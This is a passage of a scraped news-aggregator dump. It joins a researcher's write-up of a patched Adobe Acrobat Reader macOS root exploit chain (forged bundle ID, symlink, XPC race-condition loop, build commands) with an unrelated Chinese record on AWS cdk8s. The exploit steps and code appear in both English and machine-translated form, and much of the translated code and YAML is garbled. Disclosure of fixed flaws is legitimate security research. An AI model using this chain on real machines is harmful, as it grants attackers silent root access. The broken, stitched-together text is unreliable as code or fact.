remoteObjectProxyWithErrorHandler\uff1a^(NSError*proxyError){NSLog(@&#34\uff1bError\uff1a%@&#34\uff1b\uff0cproxyError)\uff1b}\u3002\n\u6211\u4eec\u9700\u8981\u7ebf\u7a0b1\u7684\u539f\u56e0\u5f88\u660e\u663e\uff0c\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u5355\u72ec\u7684\u7ebf\u7a0b2\u548c\u7ebf\u7a0b3\uff1f\n\u4f7f\u670d\u52a1\u5668\u7e41\u5fd9\u7684\u9ad8\u9891NSXPC\u63a5\u53e3\u8c03\u7528\u8bf7\u6c42\u4f1a\u589e\u52a0\u6210\u529f\u7684\u6982\u7387\u3002\u5728\u591a\u7ebf\u7a0b\u8fd0\u884c\u7684\u60c5\u51b5\u4e0b\uff0c\u4e89\u7528\u6761\u4ef6\u9700\u8981\u975e\u5e38\u77ed\u7684\u65f6\u95f4\u3002\u5728\u6211\u7684\u6d4b\u8bd5\u4e2d\uff0c\u5927\u591a\u6570\u6d4b\u8bd5\u7528\u4f8b\u53ea\u9700\u89811~3\u79d2\uff0c\u800c\u6700\u597d\u7684\u7528\u4f8b\u53ea\u9700\u8981\u8f6c\u77ac\u5373\u901d\u7684\u65f6\u95f4\u3002\n\u6f0f\u6d1e\u8865\u4e01\u6700\u91cd\u8981\u7684\u90e8\u5206\u662f\u6dfb\u52a0\u4e86\u4e00\u4e2a\u540d\u4e3a-[SMJobBless Helper validatePath]\u7684\u65b0\u51fd\u6570\uff0c\u5728validateBinary\u548c\u542f\u52a8\u4e4b\u524d\uff0c\u5b83\u4f1a\u68c0\u67e5\u8def\u5f84\u662f\u5426\u4e3a\u7b26\u53f7\u94fe\u63a5\u3002\u5b83\u6253\u7834\u4e86\u552f\u4e00\u5fc5\u987b\u901a\u8fc7\u7684\u9053\u8def\u3002\nbool-[SMJobBless Helper\u9a8c\u8bc1\u8def\u5f84](\u8def\u5f84){if(fileIsSymbolicLink(Path)){Return False\uff1b}Return True}DoWorkAndLauchHammer(){Move(&#34\uff1b./Download&34\uff1b\uff0c&#34\uff1b/var/Folders/ZZ/xxxxx/T/Download&#34\uff1b)\uff1bif(validatePaths(&#34\uff1b/var/folders/zz/xxxxx/T/download&#34\uff1b)){if(validateBinary(&#34\uff1b/var/folders/zz/xxxxx/T/download&#34\uff1b)){launch(&#34\uff1b/var/folders/zz/xxxxx/T/download&#34\uff1b)\uff1b}\n\u5728\u8fd9\u7bc7\u535a\u5ba2\u4e2d\uff0c\u6211\u5206\u6790\u4e86Adobe Acrobat Reader\u4e2d\u7684\u4e09\u4e2a\u903b\u8f91\u6f0f\u6d1e\uff0c\u5e76\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u5b83\u4eec\u5728\u6ca1\u6709\u6c99\u7bb1\u9650\u5236\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97\u6839\u3002\u4f5c\u4e3a\u51e0\u4e4e\u6bcf\u4e2a\u8bbe\u5907\u90fd\u9700\u8981\u7684\u8f6f\u4ef6\uff0c\u5b83\u7684\u5b89\u5168\u6027\u5bf9MacOS\u81f3\u5173\u91cd\u8981\u3002", "note_en": "Today, Adobe Acrobat Reader DC for macOS patched three critical vulnerabilities(CVE-2020-9615, CVE-2020-9614, CVE-2020-9613) I reported. The only requirement needed to trigger the vulnerabilities is that Adobe Acrobat Reader DC has been installed. A normal user on macOS(with SIP enabled) can locally exploit this vulnerabilities chain to elevate privilege to the ROOT without a user being aware. In this blog, I will analyze the details of vulnerabilities and show how to exploit them.\n  The root process has superpowers, it almost can do anything, reading/writing all sensitive files/databases such as Images/Calendars. However in modern macOS, root processes outside of sandbox are rare, most macOS built-in services run within a sandbox. They are no longer the king, they imprison themselves in a cage based on declarative sandbox profile rules.\n Good news, popular software with high privileged services are new good target in addition to macOS built-in services, so Adobe Acrobat Reader DC catch my attention.\n   com.adobe.ARMDC.SMJobBlessHelper within /Library/PrivilegedHelperTools/ is one of the components of Adobe Acrobat Reader DC, responsible for software updating. It runs as root and no-sandbox are applied, and hosts an XPC service named SMJobBlessHelper(com.adobe.ARMDC.SMJobBlessHelper). Most XPC services will check its connection client before doing any actual work, so does SMJobBlessHelper.\n  SMJobBlessHelper is based on NSXPC, its client checking exists in [SMJobBlessHelper listener:shouldAcceptNewConnection:]. The checking logic is as pseudo-code shows below, gets the client\u2019s PID, and then obtains Bundle ID based on the client\u2019s process path, the client will be trusted if its Bundle ID is \u201ccom.adobe.ARMDC\u201d.\n pid = [NSXPCConnection processIdentifier];  proc_pidpath(v7, proc_path, 0x1000u);  bundle = [NSBundle bundleWithPath:proc_path];  bd_id = [bundle bundleIdentifier];    if (bd_id == &#34;com.adobe.ARMDC&#34;){   // Accept client&#39;s XPC connection request  }\n  Apple says it is \u201cA representation of the code and resources stored in a bundle directory on disk.\u201d, so it\u2019s just a directory structure with some well-defined subdirectories/files. The bundle ID is obtained from Contents/Info.plist of the directory structure.\n The directory structure is certainly not credible, we can forge any Bundle ID by creating our special bundle directory.\n  As the pseudo below show, in the updating process before SMJobBlessHelper launch ARMDCHammer, download folder(in bundle\u2019s parent directory) will be moved to /var/folders/zz/xxxxx/T/. Unfortunately after directory moving, the owner of \u201c/var/folders/zz/xxxxx_n0000000000000/T/download\u201d is the root, and normal user DO NOT have access to it. So it means that we can not change it and its subfiles any more.\n   If ./download/ARMDCHammer is a symlink, after being moved to /var/folders/zz/xxxxx/T/download, does the symlink still be valid?\n Yes, the symlink is still valid, it can help us to bypass temp directory protection. I can force /var/folders/zz/xxxxx/T/download/ARMDCHammer to link to anywhere.\n     validateBinary and launchARMHammer all use program path, and we have writing permission to this path.\n So if we can replace the \u201c/tmp/test/hello_root\u201d with our malicious file after validateBinary, launchARMHammer will launch our malicious process.\n You may think the race condition window is too narrow to control, I will show the tricks later.\n   As explained before, NSBundle is not trusted, so we try to forge an NSBundle, with its bundle id is \u201ccom.adobe.ARMDC\u201d. For saving time, we copy Adobe\u2019s original bundle from \u201c/Library/Application Support/Adobe/ARMDC/Application/Adobe Acrobat Updater.app\u201d.\n   cd /tmp/ test/exploit   echo  &#34;compiling SMJobBlessHelper-Exploit&#34;  clang -framework Foundation SMJobBlessHelper-Exploit.m -o SMJobBlessHelper-Exploit     echo  &#34;move SMJobBlessHelper-Exploit to Adobe Acrobat Updater.app&#34;  mkdir  &#34;Adobe Acrobat Updater.app/Contents/MacOS&#34;  mv SMJobBlessHelper-Exploit  &#34;Adobe Acrobat Updater.app/Contents/MacOS/&#34;\n Now, SMJobBlessHelper-Exploit, being launched as an NSXPC client, will pass through [SMJobBlessHelper listener:shouldAcceptNewConnection:]\u2019s check.\n   Symlink can help us, before SMJobBlessHelper moves our download directory, we create a symlink at our download directory.\n $  cd /tmp/ test  $ mkdir download  $ ln -s /tmp/ test/hello_root ./download/ARMDCHammer  $ ls -l download/  total 0  lrwxr-xr-x 1 rekken staff 72 4 12 16:04 ARMDCHammer -&gt; /tmp/ test/hello_root\n   $ sudo ls -l /var/folders/zz/xxxxx/T/download  total 0  lrwxr-xr-x 1 rekken staff 72 4 12 16:04 ARMDCHammer -&gt; /tmp/ test/hello_root\n       (lldb) po  $rcx  (    &#34;--verify&#34;,    &#34;-R=identifier ARMDCHammer and anchor trusted and anchor apple generic and certificate leaf[subject.CN] = \\&#34;Developer ID Application: Adobe Systems, Inc. (JQ525L2MZD)\\&#34;&#34;,    &#34;/var/folders/zz/zyxvpxvq6csfxvn_n0000000000000/T/download/ARMDCHammer&#34;  )\n  I write a script, which searches the full local disk for ARMDCHammer, and finally gain nothing. But it must exist, isn\u2019t it?\n Since it is not on the local drive, it should have been downloaded on demand. I reverse a lot of binary files and found the cute download URL in Acrobat Update Helper.app. Downloading and extracting the archive, in the end, I catch the ARMDCHammer I\u2019m looking for.\n   $ codesign --verbose --verify -R= &#34;identifier ARMDCHammer and anchor trusted and anchor apple generic and certificate leaf[subject.CN] = \\&#34;Developer ID Application: Adobe Systems, Inc. (JQ525L2MZD)\\&#34;&#34; ~/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer    /Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer: valid on disk  /Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer: satisfies its Designated Requirement  /Users/rekken/Downloads/ARMDCContents2/ASSET/Contents/MacOS/ARMDCHammer: explicit requirement satisfied\n  The time window between validateBinary and launchARMHammer is narrow. OPLock can help us to freeze time in Windows, unfortunately, there are no alternatives like that in macOS.\n     Step 1: move /tmp/test/ARMDCHammer to /tmp/test/hello_root\uff0c  Step 2: sleep  Step 3: move /tmp/test/hello_root to /tmp/test/ARMDCHammer  Step 4: sleep and goto Step 1\n  Step 1: create /tmp/test/orig_download directory, create symlink /tmp/test/orig_download/ARMDCHammer pointing to /tmp/test/hello_root    Step 2: copy /tmp/test/orig_download to /tmp/test/download    Step 3: sleep    Step 4: goto Step 2 when /tmp/test/download disapears\n  while(1){   NSXPCConnection * connectionToService = [[NSXPCConnection alloc] initWithMachServiceName:@&#34;com.adobe.ARMDC.SMJobBlessHelper&#34; options: 0];   connectionToService.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SMJobBlessHelperProtocol)];   [connectionToService resume];     id remote = [connectionToService remoteObjectProxyWithErrorHandler:^(NSError *proxyError) {   NSLog(@&#34;error: %@&#34;, proxyError);   }];   [remote DoWorkAndLauchHammer: ^(_Bool retcode) {   //   }];  }\n The reason we need Thread 1 is obvious, why we need separate Thread 2 and Thread 3?\n High-frequency NSXPC interface call requests which make the server busy can increase the probability of success. With multi-threads running, the race condition needs a very short time. In my test, most test cases need only 1~3 seconds, and the best case only takes a blink of time.\n    The most important part of the vulnerability patch is adding a new function named -[SMJobBlessHelper validatePaths], before validateBinary and launch, it checks the path is a symlink or not. It breaks the only way which must be passed.\n bool -[SMJobBlessHelper validatePaths](path){   if(fileIsSymbolicLink(path)){   return false;   }   return true  }      DoWorkAndLauchHammer(){   move(&#34;./download&#34;, &#34;/var/folders/zz/xxxxx/T/download&#34;);     if(validatePaths(&#34;/var/folders/zz/xxxxx/T/download&#34;)){   if (validateBinary(&#34;/var/folders/zz/xxxxx/T/download&#34;)){   launch(&#34;/var/folders/zz/xxxxx/T/download&#34;);   }   }  }\n  In this blog, I analyzed the three logic vulnerabilities in Adobe Acrobat Reader and show how to exploit them to gain root without sandbox limitation. As an almost per-device required software, its security matters to macOS.", "posttime": "2020-05-15 00:05:40", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u6f0f\u6d1e,adobe,acrobat,flaws", "title": "Adobe Acrobat Reader\u4e2d\u7684\u5b89\u5168\u6f0f\u6d1e\u5141\u8bb8\u4ee5\u9759\u9ed8\u65b9\u5f0f\u5728MacOS\u4e0a\u83b7\u5f97\u6839", "title_en": "Security Flaws in Adobe Acrobat Reader Allow Gaining Root on macOS Silently", "transed": 1, "url": "https://rekken.github.io/2020/05/14/Security-Flaws-in-Adobe-Acrobat-Reader-Allow-Malicious-Program-to-Gain-Root-on-macOS-Silently/", "via": "", "real_tags": ["\u6f0f\u6d1e", "adobe", "acrobat", "flaws"]}, {"category": "", "categoryclass": "", "imagename": "d4e2815d580a6d47632a65c510949135.png", "infoid": 1002106, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u5728AWS\uff0c\u6211\u4eec\u770b\u5230\u5ba2\u6237\u8fc5\u901f\u91c7\u7528Kubernetes\u5728\u5168\u7403\u90e8\u7f72\u5e94\u7528\u7a0b\u5e8f\uff0c\u5927\u89c4\u6a21\u8bad\u7ec3\u673a\u5668\u5b66\u4e60\u6a21\u578b\uff0c\u5e76\u6807\u51c6\u5316\u5176\u8de8\u6570\u636e\u4e2d\u5fc3\u548c\u4e91\u4ea4\u4ed8\u521b\u65b0\u7684\u65b9\u5f0f\u3002\u4f7f\u7528Kubernetes\uff0c\u5ba2\u6237\u6b63\u5728\u6784\u5efa\u81ea\u52a8\u5316\u5de5\u5177\u4ee5\u53d6\u4ee3\u624b\u52a8\u6d41\u7a0b\uff0c\u4e3a\u5176\u57fa\u7840\u8bbe\u65bd\u7684\u6bcf\u4e00\u90e8\u5206\u5b9e\u65bd\u64cd\u4f5c\u7ba1\u9053\uff0c\u5e76\u4f7f\u5f00\u53d1\u56e2\u961f\u80fd\u591f\u83b7\u5f97\u5bf9\u5176\u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u8fd0\u884c\u7684\u7cbe\u7ec6\u63a7\u5236\u3002\n\u4f20\u7edf\u4e0a\uff0cKubernetes\u5e94\u7528\u7a0b\u5e8f\u662f\u7528\u5f00\u53d1\u4eba\u5458\u7f16\u5199\u548c\u7ef4\u62a4\u7684\u4eba\u7c7b\u53ef\u8bfb\u7684\u9759\u6001YAML\u6570\u636e\u6587\u4ef6\u5b9a\u4e49\u7684\u3002\u6784\u5efa\u65b0\u7684\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u7f16\u5199\u5927\u91cf\u7684\u6837\u677f\u914d\u7f6e\uff0c\u4ece\u5176\u4ed6\u9879\u76ee\u590d\u5236\u4ee3\u7801\uff0c\u5e76\u5e94\u7528\u624b\u52a8\u8c03\u6574\u548c\u81ea\u5b9a\u4e49\u3002\u968f\u7740\u5e94\u7528\u7a0b\u5e8f\u7684\u53d1\u5c55\u548c\u56e2\u961f\u7684\u58ee\u5927\uff0c\u8fd9\u4e9bYAML\u6587\u4ef6\u53d8\u5f97\u66f4\u96be\u7ba1\u7406\u3002\u5171\u4eab\u6700\u4f73\u5b9e\u8df5\u6216\u8fdb\u884c\u66f4\u65b0\u6d89\u53ca\u624b\u52a8\u66f4\u6539\u548c\u590d\u6742\u7684\u8fc1\u79fb\u3002\nYAML\u662f\u63cf\u8ff0\u96c6\u7fa4\u6240\u9700\u72b6\u6001\u7684\u4f18\u79c0\u683c\u5f0f\uff0c\u4f46\u5b83\u6ca1\u6709\u7528\u4e8e\u8868\u8fbe\u903b\u8f91\u548c\u53ef\u91cd\u7528\u62bd\u8c61\u7684\u539f\u8bed\u3002Kubernetes\u751f\u6001\u7cfb\u7edf\u4e2d\u6709\u591a\u79cd\u5de5\u5177(kustomize\u3001jsonnet\u3001jkcfg\u3001kubecfg\u3001kubeen\u548cPulumi\u7b49)\u8bd5\u56fe\u4ee5\u5404\u79cd\u65b9\u5f0f\u5f25\u8865\u8fd9\u4e9b\u5dee\u8ddd\u3002\n\u6211\u4eec\u610f\u8bc6\u5230\u8fd9\u4e0e\u6211\u4eec\u7684\u5ba2\u6237\u5728\u901a\u8fc7CloudForformationTemplates\u5b9a\u4e49\u5176\u5e94\u7528\u7a0b\u5e8f\u65f6\u6240\u9762\u4e34\u7684\u95ee\u9898\u5b8c\u5168\u76f8\u540c\uff0c\u8be5\u95ee\u9898\u5df2\u7531AWS CDK\u89e3\u51b3\uff0c\u6211\u4eec\u53ef\u4ee5\u5e94\u7528AWS CDK\u4e2d\u7684\u76f8\u540c\u8bbe\u8ba1\u6982\u5ff5\u6765\u5e2e\u52a9\u6240\u6709Kubernetes\u7528\u6237\u3002\n2018\u5e74\uff0c\u6211\u4eec\u63a8\u51fa\u4e86AWS\u4e91\u5f00\u53d1\u5de5\u5177\u5305(AWS CDK)\u6765\u5e2e\u52a9\u51fa\u4e8e\u8bb8\u591a\u76f8\u540c\u539f\u56e0\u60f3\u8981\u66ff\u4ee3YAML\u7684AWS CloudForment\u5ba2\u6237\u3002AWS CDK\u662f\u4e00\u4e2a\u5f00\u6e90\u6846\u67b6\uff0c\u7528\u4e8e\u4f7f\u7528\u719f\u6089\u7684\u7f16\u7a0b\u8bed\u8a00(\u5982TypeScript\u3001Python\u3001Java\u548c.NET)\u5b9a\u4e49\u4e91\u57fa\u7840\u67b6\u6784\u3002\u5ba2\u6237\u559c\u6b22AWS CDK\u4f7f\u4ed6\u4eec\u80fd\u591f\u4f7f\u7528\u73b0\u6709\u5de5\u5177\u548c\u5de5\u4f5c\u6d41\u7f16\u5199\u548c\u8c03\u914d\u5176\u57fa\u7840\u67b6\u6784\uff0c\u4ece\u800c\u7b80\u5316\u5f00\u53d1\u6d41\u7a0b\u3002\u4ed6\u4eec\u8fd8\u559c\u6b22AWS CDK\u7684\u53ef\u7ec4\u5408\u6027\uff0c\u8fd9\u4f7f\u4ed6\u4eec\u53ef\u4ee5\u8f7b\u677e\u62bd\u8c61\u51fa\u914d\u7f6e\u548c\u6837\u677f\u7ec6\u8282\u3002\u6211\u4eec\u7684\u8bb8\u591a\u5ba2\u6237\u95ee\u6211\u4eec\uff0c\u662f\u5426\u6709\u53ef\u80fd\u5c06\u540c\u6837\u7684\u6982\u5ff5\u548c\u6280\u672f\u5e94\u7528\u5230\u5e93\u4f2f\u5185\u65af\u7a7a\u95f4\u3002\n\u4eca\u5929\uff0c\u6211\u60f3\u544a\u8bc9\u60a8\u6709\u5173Kubernetes\u7684CDK\uff0c\u6216cdk8s\uff0c\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u5f00\u6e90\u9879\u76ee\uff0c\u5141\u8bb8\u60a8\u4f7f\u7528\u719f\u6089\u7684\u7f16\u7a0b\u8bed\u8a00\u5b9a\u4e49Kubernetes\u5e94\u7528\u7a0b\u5e8f\u548c\u53ef\u91cd\u7528\u7ec4\u4ef6\u3002cdk8s(\u53d1\u97f3\u4e3a\u201ccd Kates\u201d)\u5141\u8bb8\u60a8\u4f7f\u7528TypeScript\u6216Python\u7b49\u7f16\u7a0b\u8bed\u8a00\u6765\u751f\u6210\u6807\u51c6\u7684Kubernetes YAML-\u8fd9\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u5b9a\u4e49\u5728\u4efb\u4f55\u5730\u65b9\u8fd0\u884c\u7684\u4efb\u4f55Kubernetes\u96c6\u7fa4\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5305\u62ec\u5185\u90e8\u90e8\u7f72\u548c\u4e91\u73af\u5883\u3002\ncdk8S\u5141\u8bb8\u60a8\u5c06\u6838\u5fc3Kubernetes API\u5bf9\u8c61\u548c\u81ea\u5b9a\u4e49\u8d44\u6e90(CRD)\u4f5c\u4e3a\u79f0\u4e3a\u201c\u6784\u9020\u201d\u7684\u5f3a\u7c7b\u578b\u7c7b\u5bfc\u5165\u3002\u8fd9\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u6240\u6709\u5f3a\u5927\u539f\u8bed\u6765\u5b9a\u4e49Kubernetes\u5e94\u7528\u7a0b\u5e8f\u3002\u6700\u5f3a\u5927\u7684\u529f\u80fd\u4e4b\u4e00\u662f\u7f16\u5199\u60a8\u81ea\u5df1\u7684\u62bd\u8c61\u7684\u80fd\u529b\u3002\n\u4f7f\u7528cdk8\uff0c\u60a8\u53ef\u4ee5\u5c06\u5e38\u89c1\u7684Kubernetes\u6a21\u5f0f\u53d1\u5e03\u4e3a\u4ee3\u7801\u5e93\uff0c\u7136\u540e\u5728\u4efb\u4f55\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5f15\u7528\u8fd9\u4e9b\u5e93\u3002\u8fd9\u7b80\u5316\u4e86\u4e3a\u6240\u6709Kubernetes\u7528\u6237\u5b9a\u4e49\u548c\u7ef4\u62a4\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u6784\u5efa\u5728Kubernetes\u58f0\u660e\u6027API\u65b9\u6cd5\u4e4b\u4e0a\uff0c\u540c\u65f6\u4ece\u6839\u672c\u4e0a\u5c0a\u91cd\u5176\u529f\u80fd\u548c\u7075\u6d3b\u6027\u3002\u8fd9\u8fd8\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u4f7f\u7528\u60a8\u719f\u6089\u7684\u8bed\u8a00\u3001IDE\u3001\u5de5\u5177\u548c\u6280\u672f\u6765\u7f16\u5199Kubernetes\u5e94\u7528\u7a0b\u5e8f\u3002\n\u9002\u7528\u4e8e\u4efb\u4f55\u7fa4\u96c6cdk8\u4e0e\u73af\u5883\u65e0\u5173\u3002\u5b83\u5728\u60a8\u7684\u673a\u5668\u4e0a\u672c\u5730\u8fd0\u884c\uff0c\u5e76\u751f\u6210\u6807\u51c6\u7684Kubernetes YAML\u6570\u636e\uff0c\u56e0\u6b64\u60a8\u53ef\u4ee5\u5728\u4efb\u4f55\u5730\u65b9\u8fd0\u884c\u7684\u4efb\u4f55Kubernetes\u96c6\u7fa4\u4e0a\u4f7f\u7528\u5b83\uff0c\u5305\u62ec\u5185\u90e8\u90e8\u7f72\u548c\u4e91\u3002\n\u58f0\u660e\u6027\u72b6\u6001\u7684\u547d\u4ee4\u6027\u65b9\u6cd5cdk8s\u4ee3\u7801\u662f\u4f7f\u7528\u547d\u4ee4\u6027\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u4f46\u6700\u7ec8\u4f1a\u5c06\u6240\u9700\u7684\u72b6\u6001\u8f93\u51fa\u4e3a\u7eafKubernetes YAML\u3002\u8fd9\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u4eab\u53d7\u547d\u4ee4\u5f0f\u7f16\u7a0b\u7684\u8868\u73b0\u529b\u548c\u7b80\u5355\u6027\uff0c\u800c\u4e0d\u4f1a\u5f71\u54cd\u58f0\u660e\u6027\u671f\u671b\u72b6\u6001\u65b9\u6cd5\u7684\u5065\u58ee\u6027\u3002\n\u4f7f\u7528\u4efb\u4f55Kubernetes API\u7248\u672c\u548c\u81ea\u5b9a\u4e49\u8d44\u6e90cdk8\u5305\u62ec\u4e00\u4e2a\u6f02\u4eae\u7684CLI\u5de5\u5177\uff0c\u5b83\u5141\u8bb8\u60a8\u5c06\u4efb\u4f55\u7248\u672c\u7684Kubernetes API\u5bfc\u5165\u5230\u60a8\u7684\u9879\u76ee\u4e2d\uff0c\u5e76\u5728\u9700\u8981\u65f6\u8fdb\u884c\u66f4\u65b0\u4ee5\u5229\u7528\u65b0\u7684API\u7248\u672c\u3002\u60a8\u8fd8\u53ef\u4ee5\u5bfc\u5165\u81ea\u5b9a\u4e49\u8d44\u6e90\u5b9a\u4e49\u3002\n\u8bed\u8a00\u652f\u6301cdk8\u5141\u8bb8\u60a8\u4f7f\u7528TypeScript\u3001JavaScript\u548cPython\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u3002\u8ba1\u5212\u652f\u6301\u66f4\u591a\u8bed\u8a00\uff0c\u5305\u62ec\u56f4\u68cb\u3002\n\u5f00\u6e90\u7684cdk8s\u662f\u5f00\u6e90\u7684\uff0c\u6211\u4eec\u6b22\u8fce\u793e\u533a\u7684\u8d21\u732e\u3002\u6211\u4eec\u4e3a\u6574\u4e2aKubernetes\u793e\u533a\u6784\u5efa\u4e86cdk8\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662fAWS\u5ba2\u6237\u3002\n\u8ba9\u6211\u4eec\u770b\u770b\u5982\u4f55\u4f7f\u7528cdk8\u5b9a\u4e49\u4e00\u4e2a\u7b80\u5355\u7684Kubernetes\u5e94\u7528\u7a0b\u5e8f\u3002\nConst Labels={app\uff1a&#39\uff1bGuestbook&#39\uff1b\uff0ctier\uff1a&#39\uff1b\u524d\u7aef&39\uff1b}\uff1bnew k8s.Service(this\uff0c&#39\uff1bservice&#39\uff1b\uff0c{Metadata\uff1a{labels}\uff0cspec\uff1a{type\uff1a&#39\uff1bLoadBalancer&#39\uff1b\uff0cports\uff1a[{port\uff1a80}]\uff0cselector\uff1alabels\uff0c}})\uff1bnew k8s.Deployment(this\uff0c&#39\uff1bployment&#39\uff1b\uff0c{\u89c4\u8303\uff1a{\u9009\u62e9\u5668\uff1a{matchLabels\uff1aLabels}\uff0c\u526f\u672c\uff1a3\uff0c\u6a21\u677f\uff1a{Metadata\uff1a{Labels}\uff0c\u89c4\u8303\uff1a{Containers\uff1a[{Name\uff1a&#39\uff1bphp-redis&#39\uff1b\uff0c\u56fe\u7247\uff1a&#39\uff1bgcr.io/google-samples/gb-frontend:v4&#39\uff1b\uff0c\u7aef\u53e3\uff1a[{ContainerPort\uff1a80}]\uff0c\u8d44\u6e90\uff1a{\u8bf7\u6c42\uff1a{cpu\uff1a&#39\uff1b100m&#39\uff1b\uff0c\u5185\u5b58\uff1a&#39\uff1b100-#39\uff1b}]})\uff1b\n\u8fd9\u662fKubernetes\u7559\u8a00\u7c3f\u524d\u7aef\u7684\u5b9a\u4e49\uff0c\u5408\u6210\u540e\u4ea7\u751f\u4e00\u4e2a\u719f\u6089\u7684YAML\u8f93\u51fa\uff0c\u6211\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\u4e8e\u6211\u7684\u96c6\u7fa4\uff1a\napiVersion\uff1av1\u79cd\u7c7b\uff1a\u670d\u52a1\u5143\u6570\u636e\uff1a\u6807\u7b7e\uff1a\u5e94\u7528\u7a0b\u5e8f\uff1aGuestbook\u5c42\uff1a\u524d\u7aef\u540d\u79f0\uff1aGuestbook-service-23e79b52\u89c4\u8303\uff1a\u7aef\u53e3\uff1a-port\uff1a80\u9009\u62e9\u5668\uff1aApp\uff1aGuestbook\u5c42\uff1a\u524d\u7aef\u7c7b\u578b\uff1a\u8d1f\u8f7d\u5747\u8861\u5668-apiVersion\uff1aApp/v1\u79cd\u7c7b\uff1a\u90e8\u7f72\u5143\u6570\u636e\uff1a\u540d\u79f0\uff1aGuestbook-Deployment-8b2b7b76\u89c4\u8303\uff1a\u526f\u672c\uff1a3\u9009\u62e9\u5668\uff1aMatchels\uff1aApp\uff1aGuestbook\u5c42\uff1a\u524d\u7aef\u6a21\u677f\u3002-redis\u7aef\u53e3\uff1a-tainerPort\uff1a80\u8d44\u6e90\uff1a\u8bf7\u6c42\uff1aCPU\uff1a100M\u5185\u5b58\uff1a100mi\u3002\ncdk8s\u5305\u542b\u6240\u6709KubernetesAPI\u7684\u7c7b\u578b\u5316\u7c7b\u3002\u8fd9\u610f\u5473\u7740\u5f53\u6211\u7f16\u5199\u5b83\u65f6\uff0c\u6211\u53ef\u4ee5\u4ece\u6211\u5fc3\u7231\u7684IDE\u83b7\u5f97\u6240\u6709\u5e2e\u52a9\uff0c\u5176\u4e2d\u5305\u62ec\u4ee3\u7801\u5b8c\u6210\u3001\u7c7b\u578b\u5b89\u5168(\u7528\u4e8e\u9759\u6001\u8bed\u8a00)\u3001\u5185\u8054\u6587\u6863\u3001\u91cd\u6784\u5de5\u5177\u4ee5\u53ca\u6240\u6709Jazz\uff1a\n\u90a3\u4e48\u5982\u4f55\u5c06\u5176\u90e8\u7f72\u5230\u6211\u7684\u96c6\u7fa4\u4e2d\u5462\uff1f\u5f53\u6267\u884ccdk8s\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u5b83\u4f1a\u5408\u6210\u6807\u51c6\u7684Kubernetes YAML\uff0c\u7528\u4e8e\u5c06\u8be5YAML\u90e8\u7f72\u5230\u96c6\u7fa4\u7684\u5de5\u4f5c\u6d41\u548c\u5de5\u5177\u4fdd\u6301\u4e0d\u53d8\u3002\n$cdk8s synth-o dist&amp\uff1b&amp\uff1bkubectl application-f dist/*dist/guestbook.k8s.yaml service/guestbook-service-23e79b52\u5df2\u521b\u5efa\u90e8\u7f72\u3002apps/guestbook-ployment-8b2b7b76\u5df2\u521b\u5efa\u3002\n\u8fd9\u4e5f\u610f\u5473\u7740cdk8s\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u7075\u6d3b\u5730\u96c6\u6210\u5230\u4efb\u4f55\u6807\u51c6\u7684GitOps\u5de5\u4f5c\u6d41\u7a0b\u4e2d\u3002\u5c06cdk8\u4e0eGitOps\u7ed3\u5408\u4f7f\u7528\u610f\u5473\u7740\u60a8\u53ef\u4ee5\u4f7f\u7528\u4e0e\u6784\u5efa\u5e94\u7528\u7a0b\u5e8f\u76f8\u540c\u7684\u5de5\u4f5c\u6d41\u6765\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f(\u7528\u4ee3\u7801\u7f16\u5199\uff0c\u4f7f\u7528CICD\u90e8\u7f72)\u3002\u8bf7\u67e5\u770bMax Brenner\u5173\u4e8e\u5c06cdk8\u4e0eFlux\u4ee5\u53caArgo CD\u96c6\u6210\u7684\u5e16\u5b50\u3002\nCDK\u5e94\u7528\u7a0b\u5e8f\u7684\u6784\u5efa\u5757\u88ab\u79f0\u4e3a\u201c\u6784\u5efa\u201d(\u8fd8\u8bb0\u5f97\u77e9\u9635\u5417\uff1f)\u3002\u6784\u9020\u53ef\u4ee5\u4ee3\u8868\u4efb\u4f55\u4e1c\u897f\uff1a\u4ece\u5355\u4e2a\u7684Kubernetes\u8d44\u6e90(\u5982Pods)\u5230\u590d\u6742\u7684\u6982\u5ff5(\u5982\u5fae\u670d\u52a1\u6216\u6210\u719f\u7684MongoDB\u96c6\u7fa4)\u3002\u5b83\u4eec\u751a\u81f3\u53ef\u4ee5\u4ee3\u8868\u5b8c\u6574\u7684\u7cfb\u7edf\u6765\u4e3a\u60a8\u7684\u6574\u4e2a\u96c6\u7fa4\u5efa\u6a21\u3002\ncdk8\u53ef\u4ee5\u4e3a\u6240\u6709\u6838\u5fc3Kubernetes 